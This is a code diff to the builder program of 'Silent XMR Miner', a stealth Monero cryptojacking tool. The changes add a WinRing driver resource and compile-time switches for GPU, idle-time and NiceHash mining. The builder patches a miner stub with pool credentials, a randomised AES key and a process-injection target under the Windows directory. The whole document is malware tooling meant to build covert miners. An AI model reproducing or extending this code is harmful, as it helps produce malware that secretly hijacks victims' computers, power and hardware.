@@ -1,5 +1,6 @@
 ﻿Public Class Form1
     Public Shared rand As New Random()
+    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
         CheckForIllegalCrossThreadCalls = False
@@ -11,6 +12,7 @@
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
             MephForm1.Text = "Silent XMR Miner Builder"
+            txtMaxCPU.SelectedIndex = 4
         Catch ex As Exception
         End Try
 
@@ -37,6 +39,7 @@
     Public Resources_dll = Randomi(rand.Next(5, 10))
     Public Resources_xmr = Randomi(rand.Next(5, 10))
     Public Resources_libs = Randomi(rand.Next(5, 10))
+    Public Resources_winring = Randomi(rand.Next(5, 10))
     Public Resources_Parent = Randomi(rand.Next(5, 10))
     Public AESKEY As String = Randomi(rand.Next(5, 10))
 
@@ -70,13 +73,13 @@
             Source = Replace(Source, "#dll", Resources_dll)
             Source = Replace(Source, "#xmr", Resources_xmr)
             Source = Replace(Source, "#libs", Resources_libs)
+            Source = Replace(Source, "#winring", Resources_winring)
             Source = Replace(Source, "#ParentRes", Resources_Parent)
             Source = Replace(Source, "#USER", txtPoolUsername.Text)
             Source = Replace(Source, "#URL", txtPoolURL.Text)
             Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
             Source = Replace(Source, "#KEY", AESKEY)
             Source = Replace(Source, "#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
-            Source = Replace(Source, "#EnableGPU", If(toggleEnableGPU.Checked = True, "--opencl --cuda", ""))
             Source = Replace(Source, "#InjectionTarget", InjectionTarget(0))
             Source = Replace(Source, "#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
 
@@ -88,6 +91,21 @@
                 Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
             End If
 
+            If toggleEnableGPU.Checked = True Then
+                Source = Replace(Source, "#Const EnableGPU = False", "#Const EnableGPU = True")
+            End If
+
+            If toggleEnableIdle.Checked = True Then
+                Source = Replace(Source, "#Const EnableIdle = False", "#Const EnableIdle = True")
+            End If
+
+            If toggleEnableNicehash.Checked = True Then
+                Source = Replace(Source, "#Const EnableNicehash = False", "#Const EnableNicehash = True")
+            End If
+
+            If toggleEnableCPU.Checked = True Then
+                Source = Replace(Source, "#Const EnableCPU = False", "#Const EnableCPU = True")
+            End If
 
             If chkAssembly.Checked = True Then
                 txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
